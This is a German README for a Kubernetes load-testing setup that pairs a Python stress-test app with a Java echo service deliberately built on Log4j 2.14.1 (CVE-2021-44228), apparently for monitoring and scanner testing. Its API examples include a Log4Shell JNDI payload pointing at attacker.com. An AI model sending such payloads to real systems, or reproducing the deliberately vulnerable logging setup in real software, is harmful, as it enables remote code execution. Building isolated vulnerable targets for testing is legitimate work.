# Load Testing Application with Vulnerable Echo Service

🔥 **Kubernetes Load Generator für Turbonomic und Instana Testing**

Diese Anwendung besteht aus zwei Komponenten:
- **Load Test App (Python)**: Web-Interface für Stress-Tests und Echo Service Communication
- **Vulnerable Echo Service (Java)**: Absichtlich vulnerable Java Spring Boot App mit Log4j CVE-2021-44228

⚠️ **WARNUNG**: Die Echo Service Komponente enthält absichtlich die Log4j Vulnerability CVE-2021-44228 und sollte nur in isolierten Test-Umgebungen verwendet werden!

## 📋 Inhaltsverzeichnis

1. [Features](#features)
2. [Architektur](#architektur)
3. [Schnellstart](#schnellstart)
4. [Build und Deployment](#build-und-deployment)
5. [Kubernetes Manifest](#kubernetes-manifest)
6. [Zugriff auf die Anwendung](#zugriff-auf-die-anwendung)
7. [API Dokumentation](#api-dokumentation)
8. [Monitoring und Observability](#monitoring-und-observability)
9. [Sicherheitshinweise](#sicherheitshinweise)
10. [Troubleshooting](#troubleshooting)

## 🚀 Features

### Load Test App (Python)
- **Web Interface**: Benutzerfreundliche Web-Oberfläche für alle Funktionen
- **Stress Testing**: CPU und Memory Load Generation mit stress-ng
- **Echo Service Integration**: Direkte Kommunikation mit dem vulnerablen Echo Service
- **System Monitoring**: Real-time Metriken (CPU, Memory, Request Statistiken)
- **Health Checks**: Kubernetes-ready Health und Readiness Probes
- **Prometheus Metrics**: Exportiert Metriken für Monitoring

### Vulnerable Echo Service (Java)
- **Spring Boot**: Moderne Java Web Application
- **Log4j Vulnerability**: Absichtlich vulnerable Version 2.14.1 (CVE-2021-44228)
- **Echo Funktionalität**: GET und POST Endpoints für Message Echo
- **Request Logging**: Alle Requests werden geloggt (VULNERABLE)
- **Health Endpoints**: Kubernetes Health Checks
- **Actuator**: Spring Boot Actuator für Monitoring

## 🏗️ Architektur

```
┌─────────────────┐    HTTP    ┌──────────────────────┐
│   Load Test     │ ────────► │  Vulnerable Echo     │
│   App (Python)  │           │  Service (Java)      │
│   Port: 8080    │           │  Port: 8085          │
└─────────────────┘           └──────────────────────┘
         │                              │
         │                              │
    ┌────▼────┐                    ┌────▼────┐
    │ stress- │                    │ Log4j   │
    │ ng      │                    │ Logging │
    └─────────┘                    └─────────┘
```

## ⚡ Schnellstart

### 1. Repository klonen und Docker Images bauen

```bash
# Build Script ausführbar machen
chmod +x build-and-push.sh

# Docker Images bauen und zu Docker Hub pushen
./build-and-push.sh 2.0
```

### 2. Kubernetes Deployment

```bash
# Deployment Script ausführbar machen
chmod +x deploy.sh

# Anwendung deployen
./deploy.sh deploy

# Status prüfen
./deploy.sh status
```

### 3. Zugriff auf die Anwendung

```bash
# Port Forwarding einrichten
./deploy.sh port-forward
```

Dann öffnen Sie Ihren Browser:
- **Load Test App**: http://localhost:8080
- **Echo Service**: http://localhost:8085

## 🔨 Build und Deployment

### Voraussetzungen

- Docker
- Kubernetes Cluster
- kubectl konfiguriert
- Docker Hub Account (mbx1010)

### Manuelle Build-Schritte

#### Python App

```bash
# 1. app.py und requirements.txt erstellen
# 2. Dockerfile erstellen
# 3. Image bauen
docker build -t mbx1010/load-test-app:2.0 .

# 4. Image pushen
docker push mbx1010/load-test-app:2.0
```

#### Java Echo Service

```bash
# 1. Maven Projekt mit pom.xml erstellen
# 2. Java Source Code erstellen
# 3. log4j2.xml Konfiguration erstellen
# 4. Dockerfile erstellen
# 5. Image bauen
docker build -t mbx1010/vulnerable-echo-service:latest .

# 6. Image pushen
docker push mbx1010/vulnerable-echo-service:latest
```

### Automatisierter Build

```bash
# Alles auf einmal bauen und pushen
./build-and-push.sh 2.0
```

## 📄 Kubernetes Manifest

Das vollständige Kubernetes Manifest (`kubernetes-manifest.yaml`) enthält:

- **Namespace**: `load-testing`
- **ConfigMaps**: Konfiguration für beide Apps
- **Secrets**: Demo Secrets
- **PersistentVolumeClaim**: Log Storage
- **Deployments**: Load Test App (2 Replicas) + Echo Service (1 Replica)
- **Services**: ClusterIP und LoadBalancer
- **Ingress**: Path-based Routing
- **HPA**: Horizontal Pod Autoscaler
- **NetworkPolicy**: Netzwerk-Sicherheit
- **ServiceMonitor**: Prometheus Integration
- **RBAC**: ServiceAccount, Role, RoleBinding

### Deployment

```bash
# Standard Deployment
kubectl apply -f kubernetes-manifest.yaml

# Mit Custom Namespace
kubectl apply -f kubernetes-manifest.yaml -n my-namespace
```

## 🌐 Zugriff auf die Anwendung

### Via LoadBalancer (empfohlen)

```bash
# LoadBalancer IP abrufen
kubectl get service load-test-loadbalancer -n load-testing

# Zugriff via Browser
http://<LOADBALANCER-IP>
```

### Via Ingress

```bash
# Ingress IP abrufen
kubectl get ingress load-test-ingress -n load-testing

# Zugriff via Browser
http://<INGRESS-IP>/load-test
http://<INGRESS-IP>/api/echo
```

### Via Port Forward

```bash
# Port Forwarding einrichten
kubectl port-forward -n load-testing service/load-test-service 8080:80
kubectl port-forward -n load-testing service/vulnerable-echo-service 8085:8085

# Zugriff via Browser
http://localhost:8080
http://localhost:8085
```

## 📚 API Dokumentation

### Load Test App Endpoints

| Method | Endpoint | Beschreibung |
|--------|----------|--------------|
| GET | `/` | Web Interface |
| GET | `/health` | Health Check |
| GET | `/metrics` | Prometheus Metriken |
| GET | `/status` | Deployment Status |
| POST | `/stress` | Stress Test starten |
| POST | `/echo` | Echo Service aufrufen |
| POST | `/stop` | Alle Tests stoppen |

### Echo Service Endpoints

| Method | Endpoint | Beschreibung |
|--------|----------|--------------|
| GET | `/` | Service Info |
| GET | `/health` | Health Check |
| POST | `/echo` | Echo Message (VULNERABLE) |
| GET | `/echo/{message}` | Echo via GET (VULNERABLE) |

### Beispiel API Calls

```bash
# Stress Test starten
curl -X POST http://localhost:8080/stress \
  -H "Content-Type: application/json" \
  -d '{"cpu_workers": 4, "duration": 60}'

# Echo Service testen
curl -X POST http://localhost:8085/echo \
  -H "Content-Type: application/json" \
  -d '{"message": "Hello World"}'

# Vulnerable Payload (NUR für Testing!)
curl -X POST http://localhost:8085/echo \
  -H "Content-Type: application/json" \
  -d '{"message": "${jndi:ldap://attacker.com/exploit}"}'
```

## 📊 Monitoring und Observability

### Prometheus Integration

Beide Apps exportieren Metriken:

```bash
# Load Test App Metriken
curl http://localhost:8080/metrics

# Echo Service Metriken (Actuator)
curl http://localhost:8085/actuator/prometheus
```

### Instana Integration

Annotations sind bereits im Manifest enthalten:

```yaml
annotations:
  instana.io/monitored: "true"
  prometheus.io/scrape: "true"
```

### Log Aggregation

```bash
# Logs anzeigen
kubectl logs -n load-testing -l app=load-test-app
kubectl logs -n load-testing -l app=vulnerable-echo-service

# Logs folgen
kubectl logs -n load-testing -l app=load-test-app -f
```

## 🔒 Sicherheitshinweise

⚠️ **KRITISCH**: Diese Anwendung enthält absichtlich Sicherheitslücken!

### Vulnerable Echo Service

- **CVE-2021-44228**: Log4j JNDI Injection Vulnerability
- **Direktes Logging**: User Input wird ohne Validierung geloggt
- **JNDI Lookups aktiviert**: `LOG4J_FORMAT_MSG_NO_LOOKUPS=false`

### Sicherheitsmaßnahmen

1. **Nur in isolierten Test-Umgebungen verwenden**
2. **Keine Verbindung zum Internet aus dem Pod**
3. **NetworkPolicies aktiviert**
4. **Non-root Container User**
5. **ReadOnlyRootFilesystem wo möglich**
6. **Security Contexts konfiguriert**

### Network Isolation

```bash
# NetworkPolicy prüfen
kubectl get networkpolicy -n load-testing

# Pod-zu-Pod Kommunikation testen
kubectl exec -n load-testing deployment/load-test-app -- \
  curl -s http://vulnerable-echo-service:8085/health
```

## 🔧 Troubleshooting

### Häufige Probleme

#### 1. Pods starten nicht

```bash
# Events prüfen
kubectl get events -n load-testing --sort-by='.lastTimestamp'

# Pod Details anzeigen
kubectl describe pod -n load-testing -l app=load-test-app
```

#### 2. LoadBalancer IP nicht verfügbar

```bash
# Service Status prüfen
kubectl get service load-test-loadbalancer -n load-testing -o yaml

# NodePort als Alternative nutzen
kubectl get service load-test-loadbalancer -n load-testing
```

#### 3. Echo Service nicht erreichbar

```bash
# Service Endpoints prüfen
kubectl get endpoints -n load-testing

# DNS Resolution testen
kubectl exec -n load-testing deployment/load-test-app -- \
  nslookup vulnerable-echo-service
```

#### 4. stress-ng nicht verfügbar

```bash
# In Pod überprüfen
kubectl exec -n load-testing deployment/load-test-app -- \
  which stress-ng

# Logs prüfen
kubectl logs -n load-testing deployment/load-test-app
```

### Debugging Commands

```bash
# Interaktive Shell in Pod
kubectl exec -it -n load-testing deployment/load-test-app -- /bin/bash

# Resource Usage prüfen
kubectl top pods -n load-testing

# HPA Status prüfen
kubectl get hpa -n load-testing

# PVC Status prüfen
kubectl get pvc -n load-testing
```

### Deployment Script Hilfe

```bash
# Alle verfügbaren Aktionen anzeigen
./deploy.sh help

# Ausführliche Status Information
./deploy.sh status

# Connectivity Tests
./deploy.sh test

# Resource Usage
./deploy.sh status
```

## 📈 Performance Testing

### Load Test Szenarien

1. **CPU Stress Test**:
   - CPU Workers: 4-8
   - Dauer: 5-10 Minuten
   - Memory: 256MB pro Worker

2. **Memory Stress Test**:
   - Memory Workers: 2-4
   - Memory Size: 512MB-1GB
   - Dauer: 3-5 Minuten

3. **Echo Service Load**:
   - Concurrent Requests: 10-50
   - Message Size: 1KB-10KB
   - Vulnerable Payloads: 10%

### Monitoring während Tests

```bash
# Resource Usage überwachen
watch kubectl top pods -n load-testing

# HPA Scaling beobachten
watch kubectl get hpa -n load-testing

# Logs in real-time
kubectl logs -n load-testing -l app=load-test-app -f
```

## 🤝 Beitragen

1. Fork das Repository
2. Feature Branch erstellen: `git checkout -b feature/amazing-feature`
3. Änderungen committen: `git commit -m 'Add amazing feature'`
4. Branch pushen: `git push origin feature/amazing-feature`
5. Pull Request erstellen

## 📝 Lizenz

Dieses Projekt ist für Testzwecke und Demonstration gedacht. Verwenden Sie es auf eigene Verantwortung.

## 📞 Support

Bei Fragen oder Problemen:

1. Prüfen Sie die [Troubleshooting](#troubleshooting) Sektion
2. Schauen Sie in die Logs: `./deploy.sh logs`
3. Überprüfen Sie den Status: `./deploy.sh status`

---

**🚨 Erinnerung**: Diese Anwendung enthält absichtlich Sicherheitslücken und sollte nur in isolierten Test-Umgebungen verwendet werden!
